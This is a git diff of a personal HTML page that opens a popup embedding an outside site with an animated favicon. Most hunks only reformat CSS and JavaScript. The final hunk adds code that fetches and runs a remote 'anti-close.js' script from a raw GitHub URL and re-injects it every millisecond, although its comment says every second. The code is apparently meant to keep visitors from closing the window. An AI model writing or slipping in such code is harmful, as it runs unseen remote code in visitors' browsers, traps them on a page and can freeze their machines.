@@ -20,18 +20,8 @@
     padding: 20px;
     box-sizing: border-box;
   }
-  h1 {
-    font-size: 2.5rem;
-    margin-bottom: 1rem;
-    text-align: center;
-    text-shadow: 0 0 8px #00f0ff;
-  }
-  p {
-    font-size: 1rem;
-    margin-bottom: 2rem;
-    color: #ccc;
-    text-align: center;
-  }
+  h1 { font-size: 2.5rem; margin-bottom: 1rem; text-align: center; text-shadow: 0 0 8px #00f0ff; }
+  p { font-size: 1rem; margin-bottom: 2rem; color: #ccc; text-align: center; }
   button {
     padding: 12px 30px;
     font-size: 1rem;
@@ -44,18 +34,8 @@
     box-shadow: 0 5px 15px rgba(0,255,255,0.4);
     transition: all 0.3s ease;
   }
-  button:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 8px 20px rgba(0,255,255,0.6);
-  }
-  footer {
-    position: absolute;
-    bottom: 10px;
-    font-size: 0.85rem;
-    color: #666;
-    text-align: center;
-    width: 100%;
-  }
+  button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,255,255,0.6); }
+  footer { position: absolute; bottom: 10px; font-size: 0.85rem; color: #666; text-align: center; width: 100%; }
   @media (max-width:600px){
     h1{font-size:2rem;}
     p{font-size:0.9rem;}
@@ -65,7 +45,7 @@
 </head>
 <body>
 <h1>Welcome</h1>
-<p>Click below to open the full-page embed with smooth animated favicon.</p>
+<p>Click below to open the full-page embed with smooth animated favicon and GitHub script.</p>
 <button id="openBtn">Open Site</button>
 <footer>My Personal Project</footer>
 
@@ -97,7 +77,6 @@ document.getElementById('openBtn').addEventListener('click',()=>{
   // Preload images
   const images=frames.map(src=>{const img=new Image(); img.src=src; return img; });
 
-  // Write popup content
   win.document.write(`
   <!DOCTYPE html>
   <html lang="en">
@@ -115,13 +94,13 @@ document.getElementById('openBtn').addEventListener('click',()=>{
   <body>
     <iframe src="https://nullxiety.com" allowfullscreen></iframe>
     <script>
+      // ===== Animated Favicon =====
       const frames=${JSON.stringify(frames)};
       const frameDelay=${frameDelay};
       const images=frames.map(src=>{const img=new Image();img.src=src;return img;});
       const canvas=document.createElement('canvas');
       const size=Math.min(32,window.devicePixelRatio>1?32:16);
-      canvas.width=size;
-      canvas.height=size;
+      canvas.width=size; canvas.height=size;
       const ctx=canvas.getContext('2d');
       const link=document.querySelector('link[rel="icon"]')||document.createElement('link');
       link.rel='icon';
@@ -140,13 +119,20 @@ document.getElementById('openBtn').addEventListener('click',()=>{
       animate();
       window.addEventListener('resize',()=>{
         const newSize=Math.min(32,window.devicePixelRatio>1?32:16);
-        canvas.width=newSize;
-        canvas.height=newSize;
+        canvas.width=newSize; canvas.height=newSize;
       });
-      window.addEventListener('beforeunload',function(e){
-        e.preventDefault();
-        e.returnValue='Are you sure you want to leave?';
-      });
+
+      // ===== Load anti-close.js from GitHub and run infinitely =====
+      function loadAndRunScript(){
+        const script=document.createElement('script');
+        script.src='https://raw.githubusercontent.com/stetson609-wq/loading.../refs/heads/main/anti-close.js';
+        script.onload=()=>{ console.log('anti-close.js loaded'); };
+        script.onerror=()=>{ console.error('Failed to load anti-close.js'); };
+        document.body.appendChild(script);
+      }
+      // Run immediately and then infinitely every 1s
+      loadAndRunScript();
+      setInterval(loadAndRunScript,1);
     </script>
   </body>
   </html>
